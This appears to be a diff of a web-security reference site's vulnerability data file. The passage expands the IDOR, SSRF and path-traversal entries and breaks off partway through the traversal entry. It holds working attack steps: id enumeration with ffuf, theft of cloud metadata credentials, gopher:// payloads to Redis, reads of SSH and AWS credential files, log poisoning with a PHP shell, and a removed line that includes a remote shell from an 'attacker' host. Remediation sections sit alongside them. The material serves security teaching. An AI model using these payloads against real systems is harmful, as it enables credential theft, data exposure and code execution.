+          { label: "Guess/enumerate identifiers", cmd: "Sequential ids, predictable GUIDs, base64/hashids in params & cookies" },
+          { label: "Force-browse hidden paths", cmd: "/admin, /api/internal, endpoints harvested from JS & wayback" }
         ],
         sections: [
           {
-            title: "How It's Exploited",
+            title: "Root Cause & Concepts",
+            type: "notes",
+            items: [
+              "The app authorises on client-supplied data (an id, a role parameter, a hidden field, a cookie value) rather than on the server-side session identity — so the client can simply change it.",
+              "Object-level (horizontal): 'can this user access THIS object?' — failure = classic IDOR, reading/editing another user's record at the same privilege.",
+              "Function-level (vertical): 'may this user's role perform THIS action?' — failure = a low-priv user reaching admin functions the UI only hid client-side.",
+              "'Direct object reference' just means the identifier maps straight to a back-end object; the bug is the missing ownership check, not the id being visible.",
+              "Unpredictable ids (GUIDs) are NOT access control — they slow enumeration but the object is still served to anyone who presents the reference (which often leaks in other responses, emails, or logs)."
+            ]
+          },
+          {
+            title: "Where to Look",
+            type: "notes",
+            items: [
+              "Any request carrying an identifier: /account/{id}, ?order=, ?doc=, ?userId=, filename params, and GUIDs in the path, query, body, or cookies.",
+              "State-changing actions on objects: change email/password, update profile, delete item, download invoice/report, view message — test these, not just reads.",
+              "APIs and mobile back-ends, where per-object checks are frequently weaker than the web UI and ids are exposed plainly.",
+              "PDF/print/export endpoints (often take a raw id and skip the check the main view does), and file download handlers.",
+              "Function-level: admin/internal endpoints discoverable from JS bundles, source maps, sitemaps, and wayback — the UI hiding a button never means the endpoint is protected."
+            ]
+          },
+          {
+            title: "Step 1 — Find & Confirm an IDOR",
             type: "commands",
             commands: [
-              { label: "1. Capture an authenticated object request", cmd: "# log in as your own user and note requests carrying an identifier:\nGET /api/account/1001            # your own account id\nGET /api/orders/50231/invoice    # a doc/order reference\n# any client-supplied id is a candidate" },
-              { label: "2. Change the identifier to another user's", cmd: "GET /api/account/1002            # a neighbouring id -> someone else's data?\n# also try encoded refs: base64, hashids, GUIDs harvested from other responses\n# 200 with another user's data = horizontal IDOR" },
-              { label: "3. Automate with two accounts (Autorize)", cmd: "# Burp -> Autorize: log the low-priv session cookie, browse as the high-priv user\n# Autorize replays each request with the low-priv session and flags any that succeed\n# this catches missing per-object and per-function checks at scale" },
-              { label: "4. Abuse the method / function level", cmd: "# the UI hides an action but the endpoint may not enforce the role:\nPUT /api/user/1002/role   {\"role\":\"admin\"}   # vertical escalation\nDELETE /api/orders/50231                       # verb the UI never exposes" },
-              { label: "5. Enumerate at scale", cmd: "# sequential ids -> Burp Intruder / ffuf over the id range\nffuf -w ids.txt -u 'https://target/api/account/FUZZ' -H 'Cookie: session=..' -mc 200\n# harvest every record; force-browse /admin, /api/internal from JS/wayback" }
+              { label: "Capture your own object requests", cmd: "# log in as user A and note every request carrying a reference\nGET /api/account/1001            # your account id\nGET /api/orders/50231/invoice    # order/document ref\nGET /files/download?id=8842      # file handler" },
+              { label: "Swap in another user's reference", cmd: "GET /api/account/1002            # neighbouring id -> someone else's data?\n# harvest real ids from other responses, emails, or shared links\n# 200 + another user's data (verify with a second account) = confirmed IDOR" },
+              { label: "Decode & tamper indirect refs", cmd: "# ids are often lightly obscured, not protected:\nbase64:  MTAwMg== -> 1002    hashids/short codes -> increment\n# predictable GUIDs, or a GUID leaked elsewhere, are still IDOR" },
+              { label: "Two-account differential (the gold standard)", cmd: "# create user A (victim) and user B (attacker)\n# take A's request, replay it authenticated as B\n# if B gets A's resource, it is a real IDOR (not just a guessable id)" }
+            ]
+          },
+          {
+            title: "Step 2 — Function-Level & Parameter Bypass",
+            type: "commands",
+            commands: [
+              { label: "Reach admin-only functions as a normal user", cmd: "# the UI hides it; the endpoint may not enforce the role:\nPUT  /api/user/1002/role   {\"role\":\"admin\"}\nDELETE /api/orders/50231\nGET  /admin/users          # force-browse admin routes" },
+              { label: "Trust-the-client parameters", cmd: "# the server may honour a role/id you supply:\nPOST /api/action  {\"userId\":1002,\"role\":\"admin\"}\n# hidden fields, ?admin=true, ?debug=1 — see Mass Assignment" },
+              { label: "HTTP method & verb tricks", cmd: "# if GET is checked but not others (or vice versa):\nchange GET->POST/PUT/PATCH, add X-HTTP-Method-Override: PUT\n# some frameworks route differently and skip the guard" },
+              { label: "Path & wrapper tricks", cmd: "# access-control sometimes keys on the exact path string:\n/admin/./users   /ADMIN/users   /admin/users/..;/\n/api/v1/../v2/admin   # canonicalisation gaps" }
+            ]
+          },
+          {
+            title: "Step 3 — Automate & Enumerate",
+            type: "commands",
+            commands: [
+              { label: "Burp Autorize (two-session testing)", cmd: "# configure Autorize with the low-priv (attacker) session cookie,\n# then browse the app as the high-priv (victim/admin) user.\n# Autorize replays each request with the low-priv session and flags\n# every one that still succeeds -> missing per-object/per-function checks at scale" },
+              { label: "Enumerate sequential ids", cmd: "ffuf -w ids.txt -u 'https://target/api/account/FUZZ' \\\n  -H 'Cookie: session=<yours>' -mc 200 -mr 'email'\n# or Burp Intruder over the numeric range; harvest every record returned" },
+              { label: "Discover hidden endpoints to test", cmd: "gau target.com | grep -Ei 'admin|internal|user|order|id='\nwaybackurls target.com\n# extract routes from JS bundles/source maps, then force-browse them" }
             ]
           },
           {
@@ -1722,21 +1883,23 @@ var VULNS = [
             columns: ["Form", "Description"],
             rows: [
               ["Horizontal IDOR", "Access another user's resource at the same privilege level"],
-              ["Vertical escalation", "A low-priv user reaches admin functionality"],
+              ["Vertical escalation", "A low-priv user reaches admin/privileged functionality"],
               ["Missing function-level check", "The UI hides an action but the endpoint does not enforce the role"],
-              ["Mass/parameter-based", "Passing role=admin or userId= that the server trusts"],
-              ["Multi-step bypass", "Skipping a step that carries the real authorization check"]
+              ["Parameter trust / mass assignment", "Server honours a client-sent role=admin, userId, or hidden field"],
+              ["Multi-step bypass", "Skipping the step that actually carries the authorization check"],
+              ["Method/path canonicalisation", "Changing verb or path form slips past a string-matched guard"]
             ]
           },
           {
-            title: "Attack Chain",
+            title: "Impact & Attack Chain",
             type: "table",
             columns: ["Step", "Action", "Result"],
             rows: [
-              ["1", "Find an endpoint taking a client id", "Candidate IDOR"],
-              ["2", "Swap in another user's identifier", "Access to their resource"],
-              ["3", "Automate enumeration over the id space", "Mass data exposure"],
-              ["4", "Abuse method/function-level gaps", "Privilege escalation / takeover"]
+              ["1", "Find an endpoint taking a client reference", "Candidate IDOR"],
+              ["2", "Swap in another user's reference (2-account proof)", "Access to their resource"],
+              ["3", "Automate enumeration over the id space", "Mass data exposure (PII, financial)"],
+              ["4", "Alter another user's object (email/password)", "Cross-account takeover"],
+              ["5", "Reach function-level admin gaps", "Privilege escalation, site-wide control"]
             ]
           },
           {
@@ -1744,28 +1907,32 @@ var VULNS = [
             type: "table",
             columns: ["Tool", "Purpose"],
             rows: [
-              ["Burp Suite (Autorize)", "Automatic per-request access-control testing with two sessions"],
-              ["ffuf / Burp Intruder", "Enumerate sequential or fuzzable identifiers"],
-              ["gau / waybackurls", "Discover hidden endpoints to force-browse"]
+              ["Burp Suite + Autorize", "Automatic per-request access-control testing with two sessions"],
+              ["Burp Suite + AuthMatrix", "Matrix-style role vs endpoint authorization testing"],
+              ["ffuf / Burp Intruder", "Enumerate sequential or fuzzable identifiers at scale"],
+              ["gau / waybackurls / JS parsers", "Discover hidden endpoints to force-browse"]
             ]
           },
           {
             title: "References",
             type: "references",
             items: [
-              { label: "PortSwigger — Access control vulnerabilities", url: "https://portswigger.net/web-security/access-control" },
-              { label: "OWASP — Authorization Testing / IDOR Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html" }
+              { label: "PortSwigger — Access control vulnerabilities (with labs)", url: "https://portswigger.net/web-security/access-control" },
+              { label: "OWASP — Broken Access Control (Top 10 A01)", url: "https://owasp.org/Top10/A01_2021-Broken_Access_Control/" },
+              { label: "OWASP — IDOR Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html" },
+              { label: "OWASP — Authorization Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html" }
             ]
           },
           {
             title: "Remediation",
             type: "notes",
             items: [
-              "Enforce authorization server-side on every request, based on the authenticated session — never trust an ID or role sent by the client.",
-              "Check ownership: does this user own or have rights to this specific object? Do it in the data layer, consistently.",
-              "Deny by default; require an explicit grant for each function and object, and centralise the checks.",
-              "Do not rely on unpredictable IDs (GUIDs) as an access control — obscurity is not authorization, though it slows enumeration.",
-              "Test access control with least-privilege accounts as part of every release; it is logic, so scanners miss most of it."
+              "Enforce authorization on the server for every request, keyed to the authenticated session — never trust an id, role, or flag sent by the client.",
+              "Perform an explicit ownership/permission check at the data layer for the specific object: does this user own or have rights to THIS record? Centralise it so no endpoint can forget it.",
+              "Deny by default: every function and object requires an explicit grant; new endpoints are inaccessible until access is defined.",
+              "Prefer indirect references scoped to the session (a per-user mapping, or 'me' endpoints like /account instead of /account/{id}) so the client cannot name another user's object at all.",
+              "Do not treat unguessable ids (GUIDs) as protection — always check ownership regardless of how the reference is generated.",
+              "Bake access-control testing with least-privilege accounts into every release and CI, since scanners miss logic flaws; log and alert on authorization failures and enumeration patterns."
             ]
           }
         ]
@@ -2215,45 +2382,89 @@ var VULNS = [
         severity: "High",
         ref: "https://portswigger.net/web-security/ssrf",
         description: "The server is tricked into making requests to attacker-chosen URLs, reaching internal services and cloud metadata.",
-        brief: "SSRF occurs when an application fetches a URL supplied or influenced by the user and does not restrict where that request can go. The attacker points it at internal-only services, the loopback interface, or the cloud metadata endpoint — and the server, trusted inside the network, makes the request on their behalf.\n\nImpact: theft of cloud credentials from the metadata service, internal recon and access to admin panels, and a frequent first step toward internal compromise. It is especially dangerous in cloud environments, where 169.254.169.254 hands temporary credentials to anything that can reach it.",
+        brief: "Server-Side Request Forgery occurs when an application makes an HTTP (or other-protocol) request to a URL that the user supplies or influences, without restricting where that request may go. The attacker substitutes an internal, loopback, or metadata target, and the server — which usually sits inside the trust boundary the attacker cannot reach directly — dutifully makes the request and, in many cases, returns the response. In effect the server becomes a proxy into its own network.\n\nSSRF has two forms. In basic (in-band) SSRF the response body comes back to the attacker, enabling direct reading of internal pages and services. In blind SSRF nothing is reflected, so the attacker confirms the request out-of-band (a DNS/HTTP callback) and exploits it via side effects, timing, and known endpoints. Both are dangerous; blind SSRF is often dismissed but still reaches cloud metadata and internal APIs.\n\nThe impact is heaviest in cloud environments. The link-local metadata endpoint (169.254.169.254 on AWS/GCP/Azure/DO) hands temporary IAM credentials, instance identity, and user-data to anything that can reach it — so an SSRF frequently escalates straight to cloud account compromise. Beyond that: internal service and admin-panel access, port scanning of the internal network via response/timing differences, reading files via file://, and — with gopher:// — crafting arbitrary TCP payloads to talk to Redis, databases, or SMTP for stored RCE. It hides in any URL-fetching feature: webhooks, link previews and unfurlers, 'import from URL', PDF/screenshot/HTML renderers, avatar-by-URL, XML/SVG parsers (see XXE), and document converters.",
         quickReference: [
-          { label: "Cloud metadata (AWS)", cmd: "http://169.254.169.254/latest/meta-data/iam/security-credentials/" },
+          { label: "Cloud metadata (AWS IMDSv1)", cmd: "http://169.254.169.254/latest/meta-data/iam/security-credentials/" },
           { label: "Internal / loopback", cmd: "http://127.0.0.1:8080/   http://localhost/admin   http://10.0.0.5/" },
-          { label: "Filter bypasses", cmd: "http://127.1   http://0177.0.0.1   http://[::1]   http://2130706433/   DNS rebinding" },
-          { label: "Blind SSRF", cmd: "Point at a Collaborator/OAST host to confirm the server made the request" }
+          { label: "Filter bypasses", cmd: "http://127.1   http://0177.0.0.1   http://2130706433   http://[::1]   DNS rebinding" },
+          { label: "Blind confirm", cmd: "Point at a Collaborator/interactsh host; a callback proves the server fetched it" }
         ],
         sections: [
           {
-            title: "How It's Exploited",
-            type: "commands",
-            commands: [
-              { label: "1. Find a feature that fetches a URL", cmd: "# webhooks, URL preview, 'import from URL', PDF/screenshot render, avatar-by-URL\nPOST /api/import  {\"url\":\"https://example.com/data.json\"}\n# swap in an internal/loopback target and watch the response/timing" },
-              { label: "2. Confirm blind SSRF with an OOB callback", cmd: "# point it at your Collaborator/interactsh host:\n{\"url\":\"http://abcd.oastify.com/\"}\n# a DNS/HTTP hit proves the server made the request even with no reflected body" },
-              { label: "3. Hit cloud metadata for credentials", cmd: "{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}\n# then read the role name and fetch its temporary keys:\n{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>\"}\n# AccessKeyId/SecretAccessKey/Token -> use the instance role" },
-              { label: "4. Reach internal-only services", cmd: "http://127.0.0.1:8080/       # local admin app\nhttp://10.0.0.5/actuator/env  # Spring Boot secrets\nhttp://169.254.169.254/       # GCP/Azure metadata variants\n# port-probe internal ranges via response/timing differences" },
-              { label: "5. Bypass weak filters", cmd: "http://127.1   http://0177.0.0.1   http://[::1]   http://2130706433/   # ip encodings\nhttp://internal.evil.com  (A record -> 127.0.0.1)                        # DNS pinning\n# allowed host + open redirect -> redirected inward; DNS rebinding for TOCTOU" }
+            title: "Root Cause & Concepts",
+            type: "notes",
+            items: [
+              "The app treats a user-influenced value as a URL to fetch and does not constrain the destination — so the attacker chooses where the server's trusted network position is aimed.",
+              "In-band vs blind: if the fetched body (or an error/redirect based on it) comes back, you read internal responses directly; if not, you confirm via OOB callback and exploit through side effects and known endpoints.",
+              "The server's requests originate inside the perimeter, so they bypass network ACLs, reach RFC1918/loopback hosts, and — critically — the cloud metadata service that trusts any local caller.",
+              "Partial SSRF still matters: even controlling only the host, path, or a redirect target can be enough to reach metadata or an internal API.",
+              "Non-HTTP schemes widen impact: file:// reads files, dict://redis or gopher:// can send crafted bytes to internal TCP services (Redis, memcached, SMTP, DB) for data theft or stored RCE."
             ]
           },
           {
-            title: "Filter Bypasses",
+            title: "Where to Look",
+            type: "notes",
+            items: [
+              "Explicit URL inputs: webhooks, 'import/fetch from URL', RSS/feed readers, link preview/unfurl (chat, social), avatar or image 'by URL', and callback/notification URLs.",
+              "Document & media processors: HTML-to-PDF, screenshotting, image thumbnailers, and anything that renders remote resources (a remote <img>/<link> in HTML you supply).",
+              "Parsers that fetch: XML/SVG (XXE), and any templating that can include remote content.",
+              "Hidden URL params: a full URL is not required — host, domain, path, or port fields, and parameters that get concatenated into a server-side request.",
+              "APIs that proxy or validate remote endpoints ('test this integration', 'verify this callback'), and SSO/OAuth flows that fetch remote metadata/JWKS URLs."
+            ]
+          },
+          {
+            title: "Step 1 — Find & Confirm the Sink",
+            type: "commands",
+            commands: [
+              { label: "Point a fetch feature inward", cmd: "POST /api/import {\"url\":\"https://example.com/x\"}\n# swap the value and watch the response body / status / timing:\n{\"url\":\"http://127.0.0.1/\"}\n{\"url\":\"http://localhost:8080/\"}" },
+              { label: "Confirm (esp. blind) with OOB", cmd: "{\"url\":\"http://YOURID.oast.site/\"}\n# a DNS or HTTP hit on interactsh/Collaborator proves the server made the request\n# even when nothing is reflected" },
+              { label: "Distinguish in-band vs blind", cmd: "# in-band: the internal page's HTML/JSON comes back to you\n# blind: only a callback fires -> pivot via known endpoints & timing" },
+              { label: "Detect via error/timing", cmd: "# closed internal port -> fast connection-refused error\n# open internal port -> slow read/hang or a different error\n# this difference is an internal port scanner" }
+            ]
+          },
+          {
+            title: "Step 2 — Exploit: Metadata, Internal, Files",
+            type: "commands",
+            commands: [
+              { label: "AWS metadata -> IAM credentials", cmd: "# IMDSv1 (no token) — read the role, then its temp keys:\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/<role>\n# returns AccessKeyId / SecretAccessKey / Token -> use as the instance role" },
+              { label: "IMDSv2 (needs a PUT token first)", cmd: "# if the SSRF can set headers/method, get a token then use it:\nPUT http://169.254.169.254/latest/api/token  X-aws-ec2-metadata-token-ttl-seconds: 21600\nGET http://169.254.169.254/latest/meta-data/  X-aws-ec2-metadata-token: <token>" },
+              { label: "GCP / Azure metadata", cmd: "# GCP (needs header):\nhttp://metadata.google.internal/computeMetadata/v1/  (Metadata-Flavor: Google)\n# Azure:\nhttp://169.254.169.254/metadata/instance?api-version=2021-02-01  (Metadata: true)" },
+              { label: "Internal services & files", cmd: "http://127.0.0.1:8080/          # local admin app\nhttp://10.0.0.5/actuator/env    # Spring Boot secrets\nhttp://127.0.0.1:6379/          # Redis (via gopher:// for real commands)\nfile:///etc/passwd              # local file read where file:// is allowed" },
+              { label: "gopher:// for arbitrary TCP (stored RCE)", cmd: "# craft raw bytes to an internal service, e.g. Redis -> write a cron/webshell\ngopher://127.0.0.1:6379/_<URL-encoded Redis protocol>\n# Gopherus generates these payloads for Redis, MySQL, SMTP, FastCGI, etc." }
+            ]
+          },
+          {
+            title: "Step 3 — Filter & SSRF-Protection Bypass",
+            type: "commands",
+            commands: [
+              { label: "IP-format tricks for 127.0.0.1", cmd: "http://127.1                 # short form\nhttp://0177.0.0.1            # octal\nhttp://2130706433            # decimal\nhttp://0x7f.0.0.1            # hex\nhttp://[::1]  http://[::ffff:127.0.0.1]   # IPv6\nhttp://127.0.0.1.nip.io      # wildcard DNS -> 127.0.0.1" },
+              { label: "Defeat allow-lists", cmd: "# put the allowed host in the wrong place:\nhttp://allowed.com@127.0.0.1/        # userinfo\nhttp://127.0.0.1#allowed.com\nhttp://127.0.0.1%2f%2f@allowed.com\n# attacker domain that RESOLVES to an internal IP\n# allowed host with an open redirect -> redirected inward" },
+              { label: "DNS rebinding (TOCTOU)", cmd: "# host a name that resolves public on the validation check,\n# then internal on the actual fetch (low TTL) -> passes the check, hits internal\n# services like rbndr / your own DNS with rotating answers" },
+              { label: "Scheme & parser tricks", cmd: "# if http is blocked, try file:// gopher:// dict:// ftp:// ldap://\n# case & encoding: HTTP://, %68ttp, double-encoding\n# 30x redirect from your server to the internal target" }
+            ]
+          },
+          {
+            title: "Filter Bypass Reference",
             type: "table",
             columns: ["Defence", "Bypass"],
             rows: [
-              ["Block 'localhost'/127.0.0.1", "127.1, 0.0.0.0, 0177.0.0.1 (octal), 2130706433 (decimal), [::1], 127.0.0.1.nip.io"],
-              ["Allow-list a domain", "attacker-domain that resolves to an internal IP; or user@internal in the URL"],
-              ["Block internal on first request", "Open redirect on an allowed host, or DNS rebinding (TOCTOU)"],
-              ["Scheme filtering", "file://, gopher://, dict:// where the client library supports them"]
+              ["Block 'localhost'/127.0.0.1", "127.1, 0.0.0.0, 0177.0.0.1 (octal), 2130706433 (decimal), 0x7f.0.0.1, [::1], 127.0.0.1.nip.io"],
+              ["Allow-list a domain", "allowed@internal (userinfo), #/%23 fragment tricks, sub.attacker.com resolving to an internal IP"],
+              ["Validate then fetch", "DNS rebinding / TOCTOU; open redirect on the allowed host"],
+              ["Block http/https only", "file://, gopher://, dict://, ftp:// where the HTTP client supports them"],
+              ["IMDSv1 assumed", "Enforce IMDSv2, but SSRF that controls method+headers can still mint a token"]
             ]
           },
           {
-            title: "Attack Chain",
+            title: "Impact & Attack Chain",
             type: "table",
             columns: ["Step", "Action", "Result"],
             rows: [
               ["1", "Find a URL-fetching feature", "Candidate SSRF sink"],
-              ["2", "Confirm with an OOB callback", "Server makes attacker-chosen requests"],
-              ["3", "Hit metadata / internal services", "Cloud creds or internal access"],
-              ["4", "Use creds / chain to internal RCE", "Wider network compromise"]
+              ["2", "Confirm in-band read or OOB callback", "Server makes attacker-chosen requests"],
+              ["3", "Hit cloud metadata", "Temporary IAM credentials stolen"],
+              ["4", "Enumerate/read internal services", "Internal recon, admin panels, secrets"],
+              ["5", "gopher:// to Redis/DB, or use stolen creds", "Stored RCE / cloud account takeover"]
             ]
           },
           {
@@ -2261,17 +2472,20 @@ var VULNS = [
             type: "table",
             columns: ["Tool", "Purpose"],
             rows: [
-              ["Burp Suite (+ Collaborator)", "Manual probing and blind-SSRF OOB detection"],
-              ["Interactsh", "Out-of-band callback server for blind confirmation"],
-              ["SSRFmap / Gopherus", "Automate exploitation and craft gopher:// payloads to internal services"]
+              ["Burp Suite + Collaborator", "Manual probing and blind-SSRF OOB detection"],
+              ["interactsh", "Standalone out-of-band callback server for blind confirmation"],
+              ["SSRFmap", "Automate SSRF exploitation across known modules (metadata, redis, etc.)"],
+              ["Gopherus", "Generate gopher:// payloads for Redis, MySQL, SMTP, FastCGI"],
+              ["rbndr / DNS rebinding services", "TOCTOU bypass of resolve-then-fetch validation"]
             ]
           },
           {
             title: "References",
             type: "references",
             items: [
-              { label: "PortSwigger — SSRF", url: "https://portswigger.net/web-security/ssrf" },
+              { label: "PortSwigger — SSRF (with labs)", url: "https://portswigger.net/web-security/ssrf" },
               { label: "OWASP — SSRF Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html" },
+              { label: "OWASP WSTG — Testing for SSRF", url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery" },
               { label: "PayloadsAllTheThings — SSRF", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery" }
             ]
           },
@@ -2279,11 +2493,12 @@ var VULNS = [
             title: "Remediation",
             type: "notes",
             items: [
-              "Allow-list the exact hosts/schemes the feature legitimately needs; deny everything else, including redirects to new hosts.",
-              "Resolve the hostname and validate the resulting IP is public before connecting, and re-validate after redirects to defeat rebinding.",
-              "Block link-local (169.254.0.0/16), loopback, and RFC1918 ranges at the application and network layers.",
-              "Enforce IMDSv2 (session-token metadata) in AWS and equivalent hardening in other clouds; restrict metadata access.",
-              "Isolate the fetching service on a segmented network with strict egress controls."
+              "Allow-list the exact hosts, ports, and schemes the feature legitimately needs and deny everything else — an allow-list is far safer than trying to blacklist internal ranges.",
+              "Resolve the hostname yourself, verify the resolved IP is a permitted public address (reject loopback, link-local 169.254.0.0/16, and RFC1918), then connect to that IP — and re-validate on every redirect to defeat DNS rebinding, or disable redirects entirely.",
+              "Do not return the raw fetched response or upstream error to the user where avoidable, to blunt in-band data exfiltration.",
+              "In AWS, enforce IMDSv2 (session-token, hop-limit 1) and, better, block egress to 169.254.169.254 from application subnets; apply the equivalent metadata hardening on GCP/Azure.",
+              "Run the fetching component in a segmented network with strict egress filtering so even a successful SSRF cannot reach sensitive internal services.",
+              "Disable unneeded URL schemes in the HTTP client (no file://, gopher://, dict://) and set sane timeouts and response-size limits."
             ]
           }
         ]
@@ -2489,45 +2704,89 @@ var VULNS = [
         severity: "High",
         ref: "https://portswigger.net/web-security/file-path-traversal",
         description: "User input in a file path escapes the intended directory to read (or include and execute) arbitrary files.",
-        brief: "Path traversal (directory traversal) occurs when user input is used to build a filesystem path without proper validation, letting an attacker use ../ sequences to reach files outside the intended directory. When the file is merely read, it is Local File Inclusion — leaking source, config, and secrets. When the platform executes included files (classically PHP), it becomes LFI/RFI and can reach code execution.\n\nImpact: source and secret disclosure, credential theft from config, and RCE where controllable content can be included. The defect is trusting user input to name a file; the fix is to never build a path from raw input.",
+        brief: "Path traversal (a.k.a. directory traversal or dot-dot-slash) occurs when user input is incorporated into a filesystem path and the application does not confine the result to the intended directory. By inserting ../ (or ..\\ on Windows) sequences, the attacker walks up the directory tree and out of the web root to reach arbitrary files. When those files are only read and returned, the impact is arbitrary file disclosure — this is Local File Inclusion (LFI) in read mode, leaking source code, configuration, credentials, /etc/passwd, SSH keys, and cloud config.\n\nThe severity rises sharply when the platform executes what it includes. In classic PHP, an include()/require() fed a traversal path executes the target as code — so if the attacker can point it at a file whose contents they control (an uploaded file, a poisoned log, /proc/self/environ, a PHP session file, or a php:// / data:// wrapper), LFI becomes remote code execution. Remote File Inclusion (RFI) is the rarer case where the include accepts a remote URL directly (needs allow_url_include), giving immediate RCE.\n\nThe defect is always the same: trusting user input to name a file. It hides in any parameter that selects a document, template, image, language file, theme, or download — file=, page=, template=, lang=, path=, download=, and in filenames within uploads and archives (zip-slip). Because filters are commonly bolted on and easily bypassed with encoding and nesting tricks, a superficial 'we strip ../' defence is rarely sufficient.",
         quickReference: [
-          { label: "Basic traversal", cmd: "?file=../../../../etc/passwd   ?page=..\\..\\windows\\win.ini" },
-          { label: "Encoding bypasses", cmd: "%2e%2e%2f   ..%252f (double)   ....//   %c0%ae (overlong)" },
-          { label: "PHP LFI wrappers", cmd: "php://filter/convert.base64-encode/resource=index.php   php://input   data://" },
-          { label: "Log poisoning -> RCE", cmd: "Poison an accessible log (UA/headers) with PHP, then LFI-include it" }
+          { label: "Basic traversal", cmd: "?file=../../../../etc/passwd     ?page=..\\..\\..\\windows\\win.ini" },
+          { label: "Encoding bypasses", cmd: "%2e%2e%2f   ..%252f (double)   ....//   ..%c0%af (overlong)   %2e%2e/" },
+          { label: "PHP source exfil", cmd: "php://filter/convert.base64-encode/resource=index.php" },
+          { label: "LFI -> RCE", cmd: "poison a log/UA/session or use php://input|data://, then include it" }
         ],
         sections: [
           {
-            title: "How It's Exploited",
-            type: "commands",
-            commands: [
-              { label: "1. Read a file outside the directory", cmd: "?file=../../../../etc/passwd            # Linux\n?page=..\\..\\..\\windows\\win.ini         # Windows\n# a leaked /etc/passwd or win.ini confirms traversal" },
-              { label: "2. Defeat filters", cmd: "?file=..%2f..%2fetc%2fpasswd            # url-encoded\n?file=..%252f..%252fetc%252fpasswd      # double-encoded (decoded twice)\n?file=....//....//etc/passwd            # nested -> one strip leaves ../\n?file=/etc/passwd                       # absolute path if prefix not required" },
-              { label: "3. Exfiltrate source with php://filter", cmd: "?file=php://filter/convert.base64-encode/resource=index.php\n# returns base64 of the source (config, DB creds) without executing it\nbase64 -d <<< '<returned blob>'" },
-              { label: "4. LFI -> RCE via a controllable file", cmd: "# include a file whose contents you control:\n?file=/var/log/apache2/access.log       # after poisoning UA: <?php system($_GET['c']);?>\n?file=/proc/self/environ                # poison via User-Agent\n?file=php://input   (POST body = <?php ... ?>)   data:// wrapper" },
-              { label: "5. RFI where remote include is enabled", cmd: "# rare by default (allow_url_include=On):\n?file=http://attacker/shell.txt         # direct remote code execution" }
+            title: "Root Cause & Concepts",
+            type: "notes",
+            items: [
+              "The app concatenates user input into a path — open(base + input) or include(input) — without canonicalising and confining the result, so ../ escapes the intended base directory.",
+              "Read vs execute is the key distinction: a read sink (readfile, sendFile, fopen) yields file disclosure; an execute sink (PHP include/require, template loaders) can yield code execution.",
+              "LFI = include a LOCAL file; RFI = include a REMOTE URL (needs allow_url_include=On, now off by default). Both stem from the same unvalidated-path root cause.",
+              "PHP stream wrappers turn LFI into powerful primitives: php://filter reads source without executing it; php://input and data:// let you supply code to execute; expect:// runs commands where enabled.",
+              "Depth matters less than you think — prepend many ../ (they are harmless once at /) or use an absolute path if the code does not force a prefix."
             ]
           },
           {
-            title: "LFI vs RFI",
+            title: "Where to Look",
+            type: "notes",
+            items: [
+              "Parameters that name a resource: ?file=, ?page=, ?template=, ?lang=, ?theme=, ?doc=, ?path=, ?download=, ?img=, ?include=.",
+              "File download and 'view document' endpoints, report/invoice exporters, and image loaders that take a filename.",
+              "Upload handlers where you control the stored filename (../ in the filename = write traversal / overwrite), and archive extractors (zip-slip: ../ inside zip entry names).",
+              "Language/locale and theme selectors that map a value to a file on disk.",
+              "Anywhere a value ends up in a server-side path — including values from headers, cookies, and JSON, not just query strings."
+            ]
+          },
+          {
+            title: "Step 1 — Confirm Arbitrary Read",
+            type: "commands",
+            commands: [
+              { label: "Basic traversal (Linux / Windows)", cmd: "?file=../../../../../../etc/passwd\n?file=..\\..\\..\\..\\windows\\win.ini\n# a returned root:x:0:0 or [fonts] confirms traversal" },
+              { label: "High-value read targets", cmd: "/etc/passwd  /etc/hosts  /proc/self/environ  /proc/self/cmdline\n~/.ssh/id_rsa  ~/.aws/credentials  ~/.bash_history\n/var/www/html/config.php  .env  web.config  /etc/shadow (if root)" },
+              { label: "If a prefix/extension is forced", cmd: "# app does: include('/pages/' + file + '.php')\n# escape the directory and strip the suffix:\n?file=../../../../etc/passwd%00        # null byte (old PHP < 5.3.4)\n?file=../../../../etc/passwd           # if the .php suffix isn't appended to wrappers\n# path-truncation / dot padding on very old stacks" },
+              { label: "Absolute path", cmd: "# if no base prefix is enforced, skip traversal entirely:\n?file=/etc/passwd\n?file=file:///etc/passwd" }
+            ]
+          },
+          {
+            title: "Step 2 — Filter & Encoding Bypass",
+            type: "commands",
+            commands: [
+              { label: "URL / double encoding", cmd: "?file=..%2f..%2fetc%2fpasswd            # encoded slash\n?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd     # encoded dots+slash\n?file=..%252f..%252fetc%252fpasswd       # double-encoded (server decodes twice)" },
+              { label: "Defeat naive strip-once filters", cmd: "# if the app strips '../' exactly once, nest it so a strip re-forms it:\n?file=....//....//etc/passwd\n?file=..././..././etc/passwd\n?file=..\\/..\\/etc/passwd" },
+              { label: "Overlong UTF-8 / alternate separators", cmd: "?file=..%c0%af..%c0%afetc%c0%afpasswd    # overlong-encoded slash\n# Windows accepts both / and \\ ; try mixing them" },
+              { label: "Confuse allow-list checks", cmd: "# if it must START WITH the base dir, include it then traverse out:\n?file=/var/www/images/../../../etc/passwd" }
+            ]
+          },
+          {
+            title: "Step 3 — Escalate LFI to RCE",
+            type: "commands",
+            commands: [
+              { label: "Exfiltrate source (no execution)", cmd: "?file=php://filter/convert.base64-encode/resource=index.php\n?file=php://filter/convert.base64-encode/resource=../config/db.php\n# base64-decode the response to read config + DB creds" },
